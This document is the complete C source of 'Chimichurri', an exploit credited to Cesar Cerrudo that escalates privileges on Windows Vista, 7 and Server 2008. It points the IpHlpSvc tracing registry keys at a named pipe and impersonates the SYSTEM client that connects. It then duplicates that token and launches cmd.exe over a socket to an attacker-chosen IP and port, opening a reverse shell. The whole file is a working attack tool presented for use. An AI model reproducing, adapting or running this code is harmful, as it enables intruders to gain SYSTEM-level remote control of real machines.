
// Chimichurri -> Windows 2008 R1 & R2, Windows Vista and Windows 7 exploit
// by Cesar Cerrudo
// Argeniss - Information Security & Software

// Notes: 
// -Must be run by a user with impersonation and asgin primary token privileges, it can be used on IIS 7 & 7.5, SQL Server or other Windows services.
// -Chimichurri is an argentinian sauce used on asado and churrasco, the exploit name was an idea of Federico Kirschbaun, thanks Federico.

#include "stdafx.h"

DWORD dwPort;
LPSTR sIP;


DWORD SpawnReverseShell(HANDLE hToken, DWORD dwPort,LPSTR sIP)
{
    HANDLE hToken2,hTokenTmp;
	PROCESS_INFORMATION pInfo;
	STARTUPINFO         sInfo;
	WSADATA wd; 
	SOCKET sock; 
	struct sockaddr_in sin; 
	int size = sizeof(sin); 

	memset(&sin, 0, sizeof(sin)); 
	WSAStartup(MAKEWORD( 1, 1 ), &wd); 
	sock=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
	sin.sin_family = AF_INET; 
	bind(sock, (struct sockaddr*)&sin, size); 
	sin.sin_port = htons(dwPort); 
	sin.sin_addr.s_addr = inet_addr(sIP); 
	
	DWORD dwRes=connect(sock, (struct sockaddr*)&sin, size);

	if (dwRes!=0){
		printf ("/Chimichurri/-->Could not connect to %s<BR>",sIP);
		return 0;
	}
	
    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
    sInfo.cb= sizeof(STARTUPINFO);
    sInfo.lpDesktop= "WinSta0\\Default"; //so we don't have to wait on the process
 
    sInfo.dwFlags = STARTF_USESTDHANDLES;
    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError =(HANDLE) sock; 

	hTokenTmp=hToken;

	DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;

	LPTSTR lpComspec;
	lpComspec= (LPTSTR) malloc(1024*sizeof(TCHAR));
	GetEnvironmentVariable("comspec",lpComspec,1024);//it won't work if cmd.exe used as commandline param

	dwRes=CreateProcessAsUser(hToken2,  lpComspec ,NULL, NULL, NULL, TRUE,  NULL, NULL, NULL, &sInfo, &pInfo);
	
	CloseHandle(hTokenTmp);
	CloseHandle(hToken2);

	return dwRes;

}

bool SetRegistryValues(bool on)
{
   HKEY hKey;
   char a[]="\\\\localhost\\pipe\\x";
   char b[]="%windir%\\tracing";
   char *x=a;
   DWORD  y=1,dwsize=strlen(a)+1;
   bool result=false;

   if(!on){
	   x=b;
	   y=0;
	   dwsize=strlen(b)+1;
   }

   if( RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SOFTWARE\\Microsoft\\Tracing\\IpHlpSvc"),NULL,KEY_SET_VALUE|KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS )
   {
		if (RegSetValueEx(hKey,"FileDirectory",NULL,REG_EXPAND_SZ,(PBYTE)x,dwsize)== ERROR_SUCCESS )
		{
			if (RegSetValueEx(hKey,"EnableFileTracing",NULL,REG_DWORD,(PBYTE)&y,sizeof(DWORD))== ERROR_SUCCESS )
			{
				result=true;
			}
		}
		RegCloseKey(hKey);
   }

   return result;
}

DWORD WINAPI ThreadProc(LPVOID lpParameter){

  char szPipe[]= "\\\\.\\pipe\\x\\IpHlpSvc.log";
 
  HANDLE hPipe = 0,hToken=0;
  hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);
  if (!hPipe) {
    printf ("/Chimichurri/-->Couldn't create pipe<BR>");
	SetEvent(*((HANDLE *)lpParameter));
    return 0;
  }
 
  ConnectNamedPipe (hPipe, NULL);
  
  if (!ImpersonateNamedPipeClient (hPipe)) {
    printf ("/Chimichurri/-->Error impersonating pipe<BR>");	
	CloseHandle(hPipe);
	SetEvent(*((HANDLE *)lpParameter));
	return 0;
  }


  if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken )) {
		printf ("/Chimichurri/-->Couldn't get token<BR>");
		SetEvent(*((HANDLE *)lpParameter));
		return 0;
  }
  CloseHandle(hPipe);
  
  printf ("/Chimichurri/-->Got SYSTEM token...<BR>");
  printf ("/Chimichurri/-->Running reverse shell...<BR>");
  
  SpawnReverseShell(hToken,dwPort,sIP);
  
  SetEvent(*((HANDLE *)lpParameter));
  return 1;
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD lpThreadId;

	printf ("/Chimichurri/-->This exploit gives you a Local System shell <BR>");

	if (argc != 3) {
		printf ("/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>");
		return 0;
	}
	
	sIP= argv[1];
	dwPort= atoi(argv[2]);

	HANDLE hEvent=CreateEvent(NULL,false,false,NULL);
	
	CreateThread(NULL,NULL,ThreadProc,&hEvent,NULL,&lpThreadId);

	printf ("/Chimichurri/-->Changing registry values...<BR>");
	if (!SetRegistryValues(true)) {
		printf ("/Chimichurri/-->Couldn't set registry values<BR>");
		return 0;
	}

	WaitForSingleObject(hEvent,INFINITE);
	
	printf ("/Chimichurri/-->Restoring default registry values...<BR>");
	SetRegistryValues(false);

	return 0;
}

